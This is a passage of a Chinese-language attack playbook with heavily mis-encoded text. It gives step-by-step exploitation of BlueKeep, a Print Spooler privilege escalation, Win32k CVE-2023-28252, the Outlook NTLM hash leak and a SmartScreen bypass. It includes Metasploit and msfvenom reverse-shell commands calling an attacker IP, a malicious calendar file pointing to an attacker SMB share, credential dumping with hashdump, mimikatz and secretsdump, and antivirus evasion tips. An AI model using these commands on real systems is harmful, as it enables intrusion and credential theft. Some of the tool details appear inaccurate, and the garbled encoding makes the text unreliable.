ÈÄèÈÅéÁâπË£ΩÁöÑ RDP Ë´ãÊ±ÇÂ∞ÅÂåÖÔºåÊîªÊìäËÄÖÂèØ‰ª•Âú®Êú™Á∂ìË∫´‰ªΩÈ©óË≠âÁöÑÊÉÖÊ≥Å‰∏ãÈÅ†Á´ØÂü∑Ë°å‰ªªÊÑèÁ®ãÂºèÁ¢ºÔºå‰∏¶‰ª• SYSTEM Ê¨äÈôêÂèñÂæóÁõÆÊ®ô‰∏ªÊ©üÊéßÂà∂Ê¨ä„ÄÇ\
Ê≠§ÊºèÊ¥ûÂ±¨Êñº„ÄåË†ïËü≤Âûã„ÄçÊºèÊ¥ûÔºåËÉΩËá™ÂãïÊ©´ÂêëÊï£Êí≠ÔºåÂö¥ÈáçÁ®ãÂ∫¶ÂèØËàá MS08-067/EternalBlue Áõ∏Êèê‰∏¶Ë´ñ„ÄÇ

> üö® ÈÅ©Áî®Á≥ªÁµ±Ôºö

* Windows 7„ÄÅWindows XP
* Windows Server 2003„ÄÅ2008„ÄÅ2008 R2\
  ÔºàWindows 10 / Server 2016„ÄÅ2019 ‰∏çÂèóÂΩ±ÈüøÔºâ

> üéØ ÊîªÊìäÂ†¥ÊôØÔºö

* ÂÅµÊ∏¨Âà∞ÁõÆÊ®ôÊúâÈñãÊîæ RDP (TCP 3389) ‰∏îÁÑ°Êõ¥Êñ∞
* ÂèØÈÄèÈÅé Metasploit Êàñ Python Poc ÈÄ≤Ë°åÈÅ†Á´ØÊéßÂà∂

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñ (ÊñáÂ≠óÁâà)

```
1Ô∏è‚É£ ‰ΩøÁî® nmap / masscan ÂÅµÊ∏¨ÁõÆÊ®ôÊòØÂê¶ÈñãÊîæ TCP 3389
    ‚Üì
2Ô∏è‚É£ ‰ΩøÁî® rdpscan Êàñ msf Ê®°ÁµÑÁ¢∫Ë™çÊòØÂê¶ÊòìÂèó CVE-2019-0708 ÊîªÊìä
    ‚Üì
3Ô∏è‚É£ Âà©Áî® Metasploit or ÂÖ¨Èñã Poc Â∞çÁõÆÊ®ôÁôºÈÄÅÁâπË£ΩÂ∞ÅÂåÖ
    ‚Üì
4Ô∏è‚É£ ÂèñÂæóÁõÆÊ®ôÊ©üÂô® SYSTEM Ê¨äÈôêÁöÑ shell
    ‚Üì
5Ô∏è‚É£ Á∂≠Á©©ÂæåÂèØÈÄ≤Ë°åÊ©´ÂêëÊª≤ÈÄè (Â¶Ç Dump hash / RDP ‰ΩøÁî®)
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

#### 1Ô∏è‚É£ ÂÅµÊ∏¨ÁõÆÊ®ô RDP

```bash
nmap -p 3389 --script rdp-vuln-ms12-020 <target_ip>
```

Ôºà`ms12-020` script ÈÄöÂ∏∏ÂêåÊ®£ÂèØÁ¢∫Ë™ç RDP ÊòØÂê¶Â≠òÂú®ÂçîÂÆöÂº±ÈªûÔºâ

ÊàñÁî® masscan Âø´ÈÄüÊéÉÊèèÔºö

```bash
masscan -p3389 <target_subnet> --rate 10000
```

***

#### 2Ô∏è‚É£ È©óË≠âÊòØÂê¶ÁÇ∫ÊòìÂèóÊîªÊìäÁâàÊú¨

ÂèØ‰ª•‰ΩøÁî® rdpscanÔºö

```bash
rdpscan <target_ip>
```

ÊàêÂäüÂõûÂÇ≥ÊòìÂèóÊîªÊìäÊ®ôË™åÔºö

```
VULNERABLE: Host is vulnerable to BlueKeep (CVE-2019-0708)
```

***

#### 3Ô∏è‚É£ ‰ΩøÁî® Metasploit ÊîªÊìäÁØÑ‰æã

ÈñãÂïü MetasploitÔºö

```bash
msfconsole
```

ËºâÂÖ•Ê®°ÁµÑÔºö

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

Ë®≠ÂÆöÂèÉÊï∏Ôºö

```bash
set RHOSTS <target_ip>
set RPORT 3389
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
exploit
```

ÊàêÂäüÂæåÂèØÂæóÂà∞Ôºö

```
[*] Sending stage (206403 bytes) to <target_ip>
[*] Meterpreter session 1 opened
```

***

#### 4Ô∏è‚É£ Á¢∫Ë™çÊ¨äÈôê

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

***

#### 5Ô∏è‚É£ Dump hash ÊàñÈÄ≤Ë°åÊ©´Âêë

```bash
meterpreter > hashdump
```

Êàñ‰ΩøÁî® RDP Áõ¥Êé•ÈÄ≤Ë°åÁôªÂÖ•ÔºàËã•ÁõÆÊ®ôÂÖÅË®±Ôºâ„ÄÇ

***

### üõ† Â∑•ÂÖ∑Êé®Ëñ¶Ê∏ÖÂñÆ

| Â∑•ÂÖ∑ÂêçÁ®±             | ÂäüËÉΩ                                     |
| ---------------- | -------------------------------------- |
| nmap             | ÂÅµÊ∏¨ RDP ÈñãÊîæËàáÁ∞°ÊòìÂº±ÈªûÊéÉÊèè                       |
| masscan          | Â§ßÁØÑÂúçÊéÉÊèè TCP 3389                         |
| rdpscan          | Â∞àÈñÄÊéÉÊèè BlueKeep ËÑÜÂº±ÊÄß                      |
| Metasploit       | Êèê‰æõ cve\_2019\_0708\_bluekeep\_rce ÊîªÊìäÊ®°ÁµÑ |
| Nessus / Nexpose | Â∞àÊ•≠ÊºèÊ¥ûÊéÉÊèèÔºåÂèØÁ¢∫Ë™çÂ§ßË¶èÊ®° RDP Âº±Èªû                   |

***

### üì• ÊàêÂäüÁØÑ‰æãËº∏Âá∫

```
[*] Started reverse TCP handler on 10.10.14.3:4444
[*] 10.10.10.5:3389 - Sending BlueKeep RDP protocol request...
[*] Sending payload
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.5:49158) at 2023-11-05 14:05:55 +0000
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

***

### ‚ö†Ô∏è Â∏∏Ë¶ãÈåØË™§Ëàá Debug

| ÂïèÈ°å                     | Ëß£Ê±∫ÊñπÊ≥ï                                               |
| ---------------------- | -------------------------------------------------- |
| Payload ÂÇ≥ÈÄÅÂæåÁÑ°ÂõûÊáâ / Crash | BlueKeep ÂÆπÊòìÈÄ†ÊàêÁ≥ªÁµ± BSODÔºåÈúÄÂòóË©¶‰ΩéÈÄüÂÇ≥ÈÄÅÊàñÈôç‰Ωé attack attempts Ë®≠ÂÆö |
| ÈÅ†Á´ØË¢´Èò≤ÁÅ´ÁâÜÂ∞ÅÈéñ               | ËÄÉÊÖÆÊê≠ÈÖçÂÖßÁ∂≤Êª≤ÈÄèÂæåËΩâÁôº port 3389 Êàñ‰ª•ÂÖ∂‰ªñÊñπÂºèÁπûÈÅéÈò≤ÁÅ´ÁâÜ                  |
| ÈÅáÂà∞ patched ‰∏ªÊ©ü          | ÂòóË©¶ÂÖ∂‰ªñÊèêÊ¨äÊàñÊª≤ÈÄèÊñπÂºèÔºåÂ¶Ç MS17-010 Êàñ ADCS ÊîªÊìä                   |

```
Á¢∫Ë™ç Exchange Â≠òÂú®ÊºèÊ¥ûÁâàÊú¨ ‚Üí SSRF Ë¶ÅÊ±Ç ‚Üí Âü∑Ë°å RCE ‚Üí ÂèñÂæó shell
```

#### Â∑•ÂÖ∑ÁØÑ‰æãÔºö

* ÈñãÊ∫ê exploit Python script



### ‚úÖ 1Ô∏è‚É£1Ô∏è‚É£ CVE-2022-21999 (Print Spooler ÊèêÊ¨äÊºèÊ¥û)

#### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

CVE-2022-21999 ÊòØ Windows Print Spooler ÊúçÂãô‰∏≠ÁöÑÊú¨Âú∞Ê¨äÈôêÊèêÂçáÊºèÊ¥ûÔºå‰øóÁ®±„ÄåPrint Spooler EoP„ÄçÔºåÂèØ‰ª•ËÆì‰ΩéÊ¨äÈôê‰ΩøÁî®ËÄÖÈÄèÈÅé**ÊÉ°ÊÑèÂàóÂç∞‰ªªÂãô**Ëàá DLL Âä´ÊåÅÔºåÊúÄÁµÇÂ∞áËá™Ë∫´Ê¨äÈôêÊèêÂçáÁÇ∫ SYSTEM„ÄÇ

Ê≠§ÊºèÊ¥ûÂá∫ÁèæÊñº**Windows 10„ÄÅWindows 11„ÄÅWindows Server 2016/2019/2022**ÔºàÊú™Êõ¥Êñ∞ÊÉÖÊ≥Å‰∏ãÁâπÂà•Âç±Èö™Ôºâ„ÄÇ\
Ë®±Â§ö‰ºÅÊ•≠Âõ†ÁÇ∫ÈúÄË¶ÅÊåÅÁ∫åÂïüÁî® Print SpoolerÔºåÁÑ°Ê≥ïÂÖ®Èù¢ÈóúÈñâÔºåÂèçËÄå‰ΩøÊ≠§ÊºèÊ¥ûÊàêÁÇ∫ÊîªÊìäËÄÖÊúÄ‰Ω≥ÈÄ≤Â†¥Èªû‰πã‰∏Ä„ÄÇ

***

### üöÄ CVE-2022-21999 ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ

```
1Ô∏è‚É£ Á¢∫Ë™çÁõÆÊ®ôÁÇ∫ Windows ‰∏î Print Spooler ÊúçÂãôÈÅãË°å‰∏≠
       ‚Üì
2Ô∏è‚É£ Âà©Áî®ÊºèÊ¥ûÂª∫Á´ã„ÄåÊÉ°ÊÑèÂàóÂç∞‰ªªÂãô„Äç
       ‚Üì
3Ô∏è‚É£ ÈÄèÈÅé DLL Âä´ÊåÅÂ∞áÊÉ°ÊÑè DLL ‰∏äÂÇ≥Ëá≥ÁâπÂÆöÁõÆÈåÑ
       ‚Üì
4Ô∏è‚É£ Spooler Âú® SYSTEM Ê¨äÈôê‰∏ãÂü∑Ë°å DLL
       ‚Üì
5Ô∏è‚É£ ÊîªÊìäËÄÖÁç≤Âæó SYSTEM Ê¨äÈôêÂèçÂêë shell
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

***

#### 1Ô∏è‚É£ Á¢∫Ë™ç Print Spooler ÊòØÂê¶ÈÅãË°å

```powershell
Get-Service spooler
```

‚úÖ Â¶ÇÊûúÁúãÂà∞Ôºö

```
Status   Name               DisplayName
------   ----               -----------
Running  spooler            Print Spooler
```

‰ª£Ë°®ÂèØÁπºÁ∫åÊîªÊìä„ÄÇ

***

#### 2Ô∏è‚É£ Á¢∫Ë™çÊºèÊ¥ûÂ≠òÂú®

ÈÄèÈÅé nmap NSE scriptÔºö

```bash
nmap -p 445 --script=smb-vuln-ms-printer <ÁõÆÊ®ôIP>
```

> Âá∫ÁèæÁµêÊûúÊèêÁ§∫„ÄåÂèØËÉΩÂ≠òÂú®ÊºèÊ¥û„ÄçÔºåÂç≥ÂèØÈÄ≤Ë°å‰∏ã‰∏ÄÊ≠•„ÄÇ

***

#### 3Ô∏è‚É£ Âª∫Á´ãÊÉ°ÊÑè DLL

Áî¢ÁîüÂèçÂêëÈÄ£Á∑ö shellÔºö

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ÊîªÊìäÊ©üIP> LPORT=443 -f dll > evil.dll
```

***

#### 4Ô∏è‚É£ ‰∏äÂÇ≥ÊÉ°ÊÑè DLL

Â∞á DLL ‰∏äÂÇ≥Ëá≥ÁõÆÊ®ôÔºåÊîæÂú® `C:\Windows\System32\spool\drivers\x64\3\`\
ÔºàÊàñÈÄèÈÅé PowerShell ÂÇ≥Ê™îÔºâ

***

#### 5Ô∏è‚É£ ÂïüÂãï Metasploit Á≠âÂæÖÈÄ£Á∑ö

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <ÊîªÊìäIP>
set LPORT 443
run
```

***

#### 6Ô∏è‚É£ Ëß∏ÁôºÊºèÊ¥û

ÈÄèÈÅé PowerShell ÂåØÂÖ•‰∏¶Âü∑Ë°å PoC ËÖ≥Êú¨ÔºàGithub ‰∏äÊúâÂÖ¨Èñã PoCÔºâÔºö

```powershell
Import-Module .\CVE-2022-21999.ps1
Invoke-PrintSpoolerEoP -DllPath "C:\Windows\System32\spool\drivers\x64\3\evil.dll"
```

***

#### 7Ô∏è‚É£ Êé•Êî∂ SYSTEM Ê¨äÈôê

Metasploit Â∞áÂõûÂÇ≥ÊúÉË©±Ôºö

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> Ê¨äÈôêÊèêÂçáÊàêÂäüÔºÅ

***

### ‚ö°Ô∏è Debug Â∞èÊäÄÂ∑ß

| ÂïèÈ°å            | Debug ÊñπÊ≥ï                        |
| ------------- | ------------------------------- |
| Ê≤íÊúâÈÄ£Á∑öÂõûÂÇ≥        | Á¢∫Ë™ç DLL ÊîæÂú®Ê≠£Á¢∫Ë∑ØÂæë & LHOST ÊòØÂê¶ÁÇ∫ÂèØÈÅîÂú∞ÂùÄ   |
| DLL ËºâÂÖ•Â§±Êïó      | Ê™¢Êü• DLL ÊòØÂê¶ 64 ‰ΩçÂÖÉ ‰∏î msfvenom ÂèÉÊï∏Ê≠£Á¢∫ |
| Spooler ÊúçÂãôÊú™Âü∑Ë°å | ‰ΩøÁî® `Start-Service spooler` ÈáçÂïüÊúçÂãô |

***

### ‚úÖ 1Ô∏è‚É£2Ô∏è‚É£ CVE-2023-28252 (Win32k ÊèêÊ¨äÊºèÊ¥û)

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

CVE-2023-28252 ÊòØ 2023 Âπ¥ 3 ÊúàÁî±ÂæÆËªüÂÖ¨ÂëäÁöÑ„ÄåWin32k ÊèêÊ¨äÊºèÊ¥û„ÄçÔºåÈÄôÊòØ‰∏ÄÂÄãÊú¨Âú∞ÊèêÊ¨äÊºèÊ¥ûÔºàLocal Privilege Escalation, LPEÔºâÔºå\
ÂÆÉÂÖÅË®±‰ΩéÊ¨äÈôêÁî®Êà∂ÈÄèÈÅéÊÉ°ÊÑèË®≠Ë®àÁöÑÈ©ÖÂãïÊàñ API ÂëºÂè´ÔºåÂà©Áî® win32k.sys Ê†∏ÂøÉÊ®°ÁµÑ‰∏≠ÁöÑÊ¨äÈôêÈ©óË≠âÁº∫Èô∑ÔºåÂ∞áËá™Ë∫´Ê¨äÈôêÊèêÂçáÁÇ∫ SYSTEM„ÄÇ

‚ö†Ô∏è**APTÔºàÈÄ≤ÈöéÊåÅÁ∫åÊÄßÊîªÊìäÔºâÁµÑÁπîÂ∑≤Âú®Èáé‰ΩøÁî®Ê≠§ÊºèÊ¥û**ÔºåÁâπÂà•ÊòØÂú®ÈáùÂ∞ç‰ºÅÊ•≠ÂÖßÈÉ®Á∂≤Ë∑ØÊª≤ÈÄè‰∏≠Âà©Áî®È†ªÁéáÊ•µÈ´ò„ÄÇ\
‰∏ªË¶ÅÂΩ±ÈüøÁØÑÂúçÔºö

* Windows 10ÔºàÈÉ®ÂàÜÁâàÊú¨Ôºâ
* Windows 11
* Windows Server 2019/2022

***

### üöÄ CVE-2023-28252 ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ

```
1Ô∏è‚É£ Á¢∫Ë™çÁõÆÊ®ôÁ≥ªÁµ±ËàáÁâàÊú¨Ôºà10 / 11 / ServerÔºâ
       ‚Üì
2Ô∏è‚É£ Ê™¢Êü•ÊòØÂê¶ÂÆâË£ù 2023 Âπ¥ 4 ÊúàÂâçÊõ¥Êñ∞ÔºàÊºèÊ¥ûÂ≠òÂú®Ôºâ
       ‚Üì
3Ô∏è‚É£ ‰∏äÂÇ≥Â∑≤Á∑®Ë≠ØÂ•ΩÁöÑÊú¨Âú∞ÊèêÊ¨ä exploitÔºà‰∫åÈÄ≤‰ΩçÂü∑Ë°åÊ™îÔºâ
       ‚Üì
4Ô∏è‚É£ Âà©Áî®Áï∂Ââç‰ΩéÊ¨äÈôêÂ∏≥ËôüÂü∑Ë°å Exploit
       ‚Üì
5Ô∏è‚É£ ÂèñÂæó NT AUTHORITY\SYSTEM Ê¨äÈôê
       ‚Üì
6Ô∏è‚É£ Dump Á≥ªÁµ± Hash / ÊåÅ‰πÖÂåñÂæåÈñÄ / Êê∂Âèñ AD Ë≥áË®ä
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

***

#### 1Ô∏è‚É£ Á¢∫Ë™çÁ≥ªÁµ±ÁâàÊú¨

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

ÊàñËÄÖÔºö

```powershell
ver
```

> Á¢∫Ë™çÁâàÊú¨Â±¨Êñº Win10/11/Server ‰∏î 2023 Âπ¥ 4 ÊúàÊõ¥Êñ∞ÂâçÔºåÂ±¨ÊñºÊòìÂèóÊîªÊìäÁõÆÊ®ô„ÄÇ

***

#### 2Ô∏è‚É£ ÊêúÂ∞ãÂ∑≤ÂÆâË£ùÊõ¥Êñ∞

```powershell
Get-Hotfix | Sort-Object InstalledOn -Descending
```

> Â¶ÇÊûúÊ≤íÊúâ `KB5025221` Êàñ 2023 Âπ¥ 4 ÊúàÂæåÂÆâÂÖ®Êõ¥Êñ∞ÔºåË°®Á§∫ÊºèÊ¥ûÂ≠òÂú®„ÄÇ

***

#### 3Ô∏è‚É£ ‰∏äÂÇ≥ Exploit

Github ‰∏äÂ∑≤ÊúâÂÖ¨Èñã PoC ÊàñÊòØÂèØÈÄèÈÅé exploit-db ‰∏ãËºâ C/C++ Á®ãÂºèÁ¢º‰∏¶Âú®Êú¨Âú∞Á∑®Ë≠ØÊàê .exe„ÄÇ\
ÔºàÊàñ‰ΩøÁî®Â∑≤Áü• exploit Â¶Ç„ÄêCVE-2023-28252.exe„ÄëÔºâ

***

#### 4Ô∏è‚É£ Âú®ÂèóÂÆ≥ËÄÖ‰∏ªÊ©üÂü∑Ë°å

```powershell
C:\Users\user\Desktop\CVE-2023-28252.exe
```

Âü∑Ë°åÊàêÂäüÁï´Èù¢ÁØÑ‰æãÔºö

```
[+] Exploit triggered
[+] Privilege escalated: NT AUTHORITY\SYSTEM
```

***

#### 5Ô∏è‚É£ È©óË≠â SYSTEM Ê¨äÈôê

```cmd
whoami
```

ÊúÉÁúãÂà∞Ôºö

```
nt authority\system
```

***

#### 6Ô∏è‚É£ Êê∂ÂèñÂØÜÁ¢º Hash

```cmd
mimikatz.exe
sekurlsa::logonpasswords
```

Êàñ

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
```

***

### ‚ö°Ô∏è Â¶ÇÊûúÈåØË™§Â¶Ç‰Ωï DebugÔºü

| ÂïèÈ°å              | Ëß£Ê±∫ÊñπÂêë                                                     |
| --------------- | -------------------------------------------------------- |
| ÁÑ°Ê≥ïÊèêÊ¨ä / Ê≤íÊúâÂõûÊáâ     | Á¢∫Ë™çÊòØÂê¶ÁÇ∫ 2023 Âπ¥ 4 Êúà‰ª•ÂâçÊú™Êõ¥Êñ∞Á≥ªÁµ±                                  |
| Âü∑Ë°åÂ§±ÊïóÔºåÈ°ØÁ§∫„ÄåÂèóÈôê„Äç     | Á¢∫Ë™ç‰ΩøÁî®ËÄÖÂ∏≥ËôüÊòØÂê¶ÊúâÂü∫Êú¨Âü∑Ë°åÁ®ãÂºèÁöÑÊ¨äÈôê                                      |
| Á®ãÂºèË¢´ Defender ÈòªÊìã | ÂÖàÁπûÈÅéÈò≤ÊØíÔºà‰ΩøÁî® `msfvenom -e x86/shikata_ga_nai` Á∑®Á¢ºÂô®ÔºâÊàñÂà©Áî® lolbin |

* CVE-2023-28252 POCÔºàÁî± researcher ÂÖ¨ÈñãÔºâ
* Metasploit Â§ñÊéõ

#### ÁØÑ‰æãÊ≠•È©üÔºö

```bash
use exploit/windows/local/cve_2023_28252_win32k
set SESSION <session number>
set LHOST <your-ip>
exploit
```

#### Debug ÊñπÊ≥ïÔºö

* Á¢∫Ë™çÁõÆÊ®ôÁÇ∫ Windows 10 21H2 Êàñ Windows 11
* Â¶ÇÊûúÂ§±ÊïóÔºåÂòóË©¶ÊîπÁî® PowerShell ËÖ≥Êú¨ exploit

***

### ‚úÖ 1Ô∏è‚É£3Ô∏è‚É£ CVE-2023-23397 (Outlook NTLM Ê¥©Êºè)

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

CVE-2023-23397 ÊòØ 2023 Âπ¥ 3 ÊúàÂæÆËªüÂÖ¨ÂëäÁöÑ„ÄåOutlook NTLM ÂìàÂ∏åÊ¥©ÊºèÊºèÊ¥û„ÄçÔºåÂ±¨Êñº **Èõ∂‰∫íÂãïÊºèÊ¥ûÔºàZero-Click VulnerabilityÔºâ**„ÄÇ\
ÊîªÊìäËÄÖÂè™ÈúÄË¶ÅÈÄèÈÅéÂêëÁõÆÊ®ôÂØÑÈÄÅÁâπË£Ω Outlook Ë°å‰∫ãÊõÜÈÇÄË´ãÔºàÈÄèÈÅé MAPI ÂçîÂÆöÔºâÊàñÊÉ°ÊÑèÈÉµ‰ª∂ÔºåÂç≥ÂèØËß∏Áôº Outlook Â∞çÊîªÊìäËÄÖÊåáÂÆöÁöÑ SMB ÂàÜ‰∫´Ë∑ØÂæëÁôºÂá∫ NTLM Ë™çË≠âË´ãÊ±ÇÔºåÈÄ≤ËÄåÈÄ†Êàê NTLM hash Ê¥©Êºè„ÄÇ

**ÂΩ±ÈüøÁØÑÂúç**Ôºö

* Outlook Ê°åÈù¢ÁâàÔºàWindowsÔºâ
* Windows Server ‰∏äÁöÑ Outlook ÂÆâË£ù
* ÂΩ±ÈüøÁâàÊú¨Ôºö2013„ÄÅ2016„ÄÅ2019„ÄÅOutlook for Microsoft 365

> ‚úÖ**APT ÂúòÈöäÂ∑≤Âª£Ê≥õÂà©Áî®ÔºåÁâπÂà•ÈáùÂ∞çÂ§ßÂûã‰ºÅÊ•≠„ÄÅÊîøÂ∫úÊ©üÊßãÂÖßÈÉ®ÈÄ≤Ë°åÊÜëË≠âÁ´äÂèñËàáÂæåÁ∫å lateral movement ÊîªÊìä**„ÄÇ

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ

```
1Ô∏è‚É£ Á¢∫Ë™çÁõÆÊ®ôÂÖ¨Âè∏‰ΩøÁî® Outlook Ê°åÈù¢Áâà
       ‚Üì
2Ô∏è‚É£ Êû∂Ë®≠ÊÉ°ÊÑè SMB ServerÔºàÂèØ‰ΩøÁî® responderÔºâ
       ‚Üì
3Ô∏è‚É£ Ë£Ω‰ΩúÊÉ°ÊÑè Outlook Ë°å‰∫ãÊõÜÈÇÄË´ã / ÈÉµ‰ª∂ÔºåÂê´ UNC Ë∑ØÂæë (\\attacker-ip\share)
       ‚Üì
4Ô∏è‚É£ ÁõÆÊ®ôÈñãÂïü Outlook ÊàñÂêåÊ≠•ÔºåÂç≥Ëß∏Áôº NTLM Ë™çË≠âÊ¥©Êºè
       ‚Üì
5Ô∏è‚É£ ÊçïÁç≤ NTLM ÂìàÂ∏å
       ‚Üì
6Ô∏è‚É£ ÈõúÊπäÊö¥ÂäõÁ†¥Ëß£ÊàñÂà©Áî® NTLM relay
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

***

#### 1Ô∏è‚É£ ÊîªÊìäËÄÖÂÖàÊû∂Ë®≠ SMB ÊçïÊçâ‰º∫ÊúçÂô®

```bash
responder -I eth0 -wrf
```

> * `-I` ÊåáÂÆö‰ªãÈù¢
> * `-wrf` ÂêåÊôÇÊîîÊà™Á∂≤È†Å„ÄÅDNS„ÄÅSMB Á≠âË´ãÊ±Ç

***

#### 2Ô∏è‚É£ Ë£Ω‰Ωú Outlook Ë°å‰∫ãÊõÜÈÇÄË´ã

‰Ω†ÂèØ‰ª•Áî® Powershell Áî¢ÁîüÊÉ°ÊÑè `msg` Ê™îÊ°àÔºå‰πüÂèØ‰ª•ÈÄèÈÅé `Python` ËÖ≥Êú¨Ëá™ÂãïÁî¢Áîü„ÄÇ

ÁØÑ‰æãÔºö

```powershell
New-Item -ItemType File -Path "exploit.ics" -Value @"
BEGIN:VCALENDAR
BEGIN:VEVENT
SUMMARY:Hacker Meeting
LOCATION:\\10.10.14.5\share
DTSTART;TZID=America/New_York:20230323T090000
DTEND;TZID=America/New_York:20230323T100000
END:VEVENT
END:VCALENDAR
"@
```

> Â∞áÊ™îÊ°àÂØÑÈÄÅÁµ¶ÁõÆÊ®ôÔºåÊàñÈÄèÈÅéÁ§æ‰∫§Â∑•Á®ãÂºïÂ∞éÁõÆÊ®ôÈªûÊìä„ÄÇ

***

#### 3Ô∏è‚É£ Á≠âÂæÖÁõÆÊ®ôËß∏Áôº

Áï∂ÁõÆÊ®ô‰ΩøÁî® Outlook ÈñãÂïüË°å‰∫ãÊõÜÊàñÂêåÊ≠•Â∏≥ËôüÊôÇÔºåÂç≥ÊúÉÂòóË©¶ÈÄ£Á∑öÂà∞ÊåáÂÆö UNC Ë∑ØÂæëÔºåResponder ÊúÉÂá∫Áèæ‰∏ãÂàóÁï´Èù¢Ôºö

```
[SMB] NTLMv2-SSP Client   : 10.10.10.25
[SMB] NTLMv2-SSP Hash    : DOMAIN\User::DOMAIN:...
```

***

#### 4Ô∏è‚É£ Á†¥Ëß£ NTLM ÂìàÂ∏åÔºàÂèØÈÅ∏Ôºâ

‰ΩøÁî® hashcat ÂòóË©¶Êö¥ÂäõÁ†¥Ëß£Ôºö

```bash
hashcat -m 5600 captured.hash rockyou.txt
```

> `-m 5600` ÁÇ∫ NTLMv2 Ê®°Âºè

***

### ‚ö°Ô∏è Â¶ÇÊûú‰∏çÊàêÂäüÂ¶Ç‰Ωï DebugÔºü

| ÂïèÈ°å                | Ëß£Ê±∫ÊñπÂêë                           |
| ----------------- | ------------------------------ |
| Outlook Ê≤íÊúâËß∏ÁôºÈÄ£Á∑ö    | Á¢∫Ë™çË∑ØÂæëÊ†ºÂºèÊòØÂê¶ÁÇ∫ `\\IP\share`ÔºåIP ÊòØÂê¶ÂèØÈÅî |
| Responder Ê≤íÊúâÊî∂Âà∞ÂìàÂ∏å  | Á¢∫‰øùÁõÆÊ®ôÊ≤íÊúâ‰ΩøÁî® ProxyÔºå‰∏¶‰∏îÊ≤íÊúâÈòªÊìã SMB ÊµÅÈáè   |
| Ê≤íÊúâÁôªÂÖ• Outlook Â∞±‰∏çËß∏Áôº | Á§æ‰∫§Â∑•Á®ãË™òÂ∞éÈñãÂïü Outlook ÊàñÈáçÊñ∞ÂïüÂãïÈõªËÖ¶       |

***

### ‚úÖ 1Ô∏è‚É£4Ô∏è‚É£ CVE-2023-24880 (SmartScreen Bypass)

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

CVE-2023-24880 ÊòØ‰∏ÄÂÄãÁπûÈÅé Windows SmartScreen ‰øùË≠∑Ê©üÂà∂ÁöÑÊºèÊ¥û„ÄÇ\
SmartScreen ÊòØÂæÆËªüÊèê‰æõÁöÑ„ÄåÊÉ°ÊÑè‰∏ãËºâÈò≤Ë≠∑Ê©üÂà∂„ÄçÔºåÊúÉÂ∞çÂèØÁñëÂèØÂü∑Ë°åÊ™îÔºàÂ¶Ç .exe„ÄÅ.msi„ÄÅ.lnkÔºâÂΩàÂá∫Ë≠¶ÂëäË¶ñÁ™ó„ÄÇ

> ‚ö† ÈÄôÂÄãÊºèÊ¥ûÂÖÅË®±ÊîªÊìäËÄÖË£Ω‰Ωú‰∏ÄÂÄã **„ÄåÂ∑≤Á∞ΩÁ´†„Äç‰ΩÜÁπûÈÅé SmartScreen ÁöÑÊÉ°ÊÑèÊ™îÊ°à„Äç**Ôºå‰∏ÄÊó¶ÂèóÂÆ≥ËÄÖÂü∑Ë°åÊ≠§Ê™îÊ°àÔºåWindows ‰∏çÊúÉË∑≥Âá∫„ÄåÊ≠§Ê™îÊ°à‰æÜËá™Êú™Áü•‰æÜÊ∫êÔºåÂèØËÉΩÂç±Èö™„ÄçÁöÑÊèêÁ§∫„ÄÇ

Ê≠§ÊºèÊ¥ûÂ∑≤Á∂ìË¢´Â§öÂÄã APT ÂúòÈöäÂèäÊÉ°ÊÑèËªüÈ´îÈñãÁôºËÄÖÔºàÂ¶Ç infostealer„ÄÅÈäÄË°åÊú®È¶¨ÔºâÂ§ßÈáèÂà©Áî®ÔºåÁâπÂà•ÂÆπÊòìÂú® **Èá£È≠ö‰ø°‰ª∂ÈôÑÂä†Ê™îÊ°à„ÄÅÂÅΩÈÄ†‰ºÅÊ•≠Êõ¥Êñ∞ÂåÖ** ‰∏≠Âá∫Áèæ„ÄÇ

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ

```
1Ô∏è‚É£ ÊîªÊìäËÄÖË£Ω‰ΩúÊÉ°ÊÑè payloadÔºàmsi / exeÔºâ
       ‚Üì
2Ô∏è‚É£ Âà©Áî® CVE-2023-24880 ÊâìÂåÖÁÇ∫ SmartScreen-bypass ÂèØÂü∑Ë°åÊ™î
       ‚Üì
3Ô∏è‚É£ Á§æ‰∫§Â∑•Á®ãÂØÑÈÄÅÔºàÈá£È≠ö‰ø° / USB dropÔºâ
       ‚Üì
4Ô∏è‚É£ ÁõÆÊ®ôÈªûÊìäÊôÇ SmartScreen ‰∏çÊúÉË≠¶Âëä
       ‚Üì
5Ô∏è‚É£ Payload Âü∑Ë°åÔºåÂèñÂæóÊéßÂà∂
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

***

#### 1Ô∏è‚É£ Ë£Ω‰ΩúÊÉ°ÊÑè payload

‰ΩøÁî® msfvenomÔºö

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe -o backdoor.exe
```

***

